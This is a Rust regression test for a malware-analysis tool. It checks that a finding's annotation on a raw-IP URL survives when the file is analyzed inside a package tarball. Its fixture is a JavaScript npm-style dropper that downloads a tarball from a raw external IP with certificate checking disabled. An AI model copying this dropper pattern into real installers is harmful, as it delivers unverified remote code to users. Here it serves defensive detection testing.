//! Regression test: a context note must never outlive the finding it annotates.
//!
//! Symptom (observed on `@onescience/onecode`, an npm dropper that fetches its
//! platform binary from `https://<raw-ip>:4443/`): the raw-IP URL on line 16 of
//! `platform-bootstrap.mjs` carried ten matching traits, rendered its
//! annotation when the file was analyzed standalone, and rendered *nothing*
//! when the same bytes were analyzed inside the package tarball.
//!
//! Cause: `context::capture` runs during member analysis, but the low-value
//! `any:`-rule filter runs at the end of the container's analysis. A composite
//! won the byte span, `dedup_notes` discarded every weaker note overlapping it
//! ("two traits matching the same span are redundant"), and the filter then
//! deleted the winner — so the location was left with no annotation at all,
//! in the terminal view and in prism alike.
//!
//! Asserted here on the path that broke: the same source inside a tarball,
//! where the member is captured before the container's filter runs.

/// A JavaScript installer whose download base is a raw external IP. The shape
/// matters: an IP-literal URL plus an HTTP fetch is what makes the C2/dropper
/// composites fire on the member, which is what contended for the byte span.
const BOOTSTRAP_JS: &str = r#"import https from "https"
import fs from "fs"

const DEFAULT_TGZ_BASE = "https://203.0.113.9:4443/pkg_tgz"

function downloadFile(url, dest) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(dest)
    https.get(url, { rejectUnauthorized: false }, (res) => {
      res.pipe(file)
      file.on("finish", () => file.close(resolve))
    })
  })
}

export async function bootstrap(version) {
  const url = `${DEFAULT_TGZ_BASE}/pkg-${version}.tgz`
  await downloadFile(url, "/tmp/pkg.tgz")
}
"#;

/// The raw-IP URL literal, whose byte span is the location that rendered bare.
const IP_URL: &str = "https://203.0.113.9:4443/pkg_tgz";

fn tarball(dir: &std::path::Path) -> anyhow::Result<std::path::PathBuf> {
    let path = dir.join("pkg.tgz");
    let gz = flate2::write::GzEncoder::new(
        std::fs::File::create(&path)?,
        flate2::Compression::default(),
    );
    let mut tar = tar::Builder::new(gz);
    let mut header = tar::Header::new_gnu();
    header.set_size(BOOTSTRAP_JS.len() as u64);
    header.set_mode(0o644);
    header.set_cksum();
    tar.append_data(
        &mut header,
        "package/platform-bootstrap.mjs",
        BOOTSTRAP_JS.as_bytes(),
    )?;
    tar.into_inner()?.finish()?;
    Ok(path)
}

fn options() -> cleave::AnalysisOptions {
    cleave::AnalysisOptions {
        disable_yara: true,
        disable_radare2: true,
        disable_upx: true,
        ..Default::default()
    }
}

#[test]
fn raw_ip_url_in_an_archive_member_keeps_its_annotation() -> anyhow::Result<()> {
    let dir = tempfile::tempdir()?;
    let report = cleave::analyze_file(&tarball(dir.path())?, &options())?;

    let member = report
        .files
        .iter()
        .find(|f| f.path.ends_with("platform-bootstrap.mjs"))
        .expect("tarball member is analyzed as its own file");

    let ip_at = BOOTSTRAP_JS
        .find(IP_URL)
        .expect("fixture contains the raw-IP URL") as u64;
    let ip_end = ip_at + IP_URL.len() as u64;

    // Sanity: without a trait on the URL the test proves nothing. Trait ids are
    // deliberately not pinned — any trait covering the span satisfies this.
    let matched: Vec<&str> = member
        .findings
        .iter()
        .filter(|f| {
            f.evidence
                .iter()
                .flat_map(|e| e.offsets.iter())
                .any(|off| *off >= ip_at && *off < ip_end)
        })
        .map(|f| f.id.as_str())
        .collect();
    assert!(
        !matched.is_empty(),
        "no trait matched the raw-IP URL at byte {ip_at}; fixture no longer exercises the bug"
    );

    let annotated = member
        .context
        .iter()
        .any(|line| line.notes.iter().any(|n| n.off >= ip_at && n.off < ip_end));
    assert!(
        annotated,
        "the raw-IP URL matched {matched:?} but rendered no annotation: \
         a note that won the span was deleted after capture"
    );
    Ok(())
}
